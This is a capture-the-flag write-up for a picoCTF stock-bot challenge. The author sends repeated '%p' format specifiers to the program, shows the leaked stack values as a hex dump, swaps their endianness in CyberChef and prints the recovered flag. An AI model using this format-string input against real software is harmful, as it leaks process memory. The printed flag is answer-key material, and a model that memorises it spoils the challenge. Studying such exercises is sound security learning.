# Problem Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!   
## File attached to problem
![Screenshot from 2023-02-21 23-29-06](https://user-images.githubusercontent.com/123538724/220423865-f14a10e4-c2f2-4c0e-9310-de311e1101ab.png)
![Screenshot from 2023-02-21 23-29-23](https://user-images.githubusercontent.com/123538724/220423871-c6808541-96ba-4344-87c9-4e5f66adeb2f.png)
![Screenshot from 2023-02-21 23-29-34](https://user-images.githubusercontent.com/123538724/220423877-dc515f16-e3c8-4d00-9562-b2a26aa49c54.png)
![Screenshot from 2023-02-21 23-29-42](https://user-images.githubusercontent.com/123538724/220423880-10bb0d36-dcb2-4755-b85b-3e0e746ca0d6.png)
![Screenshot from 2023-02-21 23-29-48](https://user-images.githubusercontent.com/123538724/220423887-db5b51e4-2b5e-4287-bb35-31be071524bd.png)
## Solution
First I read about Format String attack from https://owasp.org/www-community/attacks/Format_string_attack  
The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.  
  
  
  This is what it showed when I ran in normally
  ![Screenshot from 2023-02-21 23-35-21](https://user-images.githubusercontent.com/123538724/220424790-fecfaae6-a64c-4162-925c-690fcc90dac4.png)
  
  When I put %p in input , format string attack could be seen
   ![Screenshot from 2023-02-21 23-41-50](https://user-images.githubusercontent.com/123538724/220426033-a7242541-b63e-4463-a023-c8ad30c6f459.png)
   
Did %p a lot of times and got this   

0x90773d00x804b0000x80489c30xf7f57d800xffffffff0x10x90751600xf7f651100xf7f57dc7(nil)0x90761800x10x90773b00x90773d00x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x626337630x656163360xffdc007d0xf7f92af80xf7f654400xc3fd73000x1(nil)0xf7df4ce90xf7f660c00xf7f575c00xf7f570000xffdc2c380xf7de568d0xf7f575c00x8048eca0xffdc2c44(nil)0xf7f79f090x804b0000xf7f570000xf7f57e200xffdc2c780xf7f7fd500xf7f588900xc3fd73000xf7f570000x804b0000xffdc2c780x8048c860x90751600xffdc2c640xffdc2c780x8048be90xf7f573fc(nil)0xffdc2d2c0xffdc2d240x10x10x90751600xc3fd73000xffdc2c90(nil)(nil)0xf7d9afa10xf7f570000xf7f57000(nil)0xf7d9afa10x10xffdc2d240xffdc2d2c0xffdc2cb40x1(nil)0xf7f570000xf7f7a70a0xf7f92000(nil)0xf7f57000(nil)(nil)0xc0020f730xcb05e963(nil)(nil)(nil)0x10x8048630(nil)0xf7f7fd500xf7f7a9600x804b0000x10x8048630(nil)0x80486620x8048b850x10xffdc2d240x8048cd00x8048d300xf7f7a9600xffdc2d1c0xf7f929400x10xffdc2e78(nil)0xffdc2eb10xffdc2ebe0xffdc2ec70xffdc2ef60xffdc2f2e0xffdc2f490xffdc2f6b0xffdc2f73(nil)0x200xf7f6ab500x210xf7f6a0000x100x1f8bfbff0x60x10000x110x640x30x80480340x40x200x50x90x70xf7f6b0000x8(nil)0x90x80486300xb0x4120xc0x4120xd0x4130xe0x4130x17

Used cyberchef to get a meaningful value  
Didn't get a meaningful value first but when I removed some of the starting part saw a flag like format    
Edited out the parts which did not have the jumbled up flag  

![Screenshot from 2023-02-21 23-56-20](https://user-images.githubusercontent.com/123538724/220428726-60c0ba44-f11c-44f8-bb8b-f061fb587c26.png)
Saw a video to understand I need to use Swap endianness to unjumble

## Flag
![image](https://user-images.githubusercontent.com/123538724/220429433-e79b1ccb-f7ca-4e94-9655-e71ea94cc198.png)
picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}



  
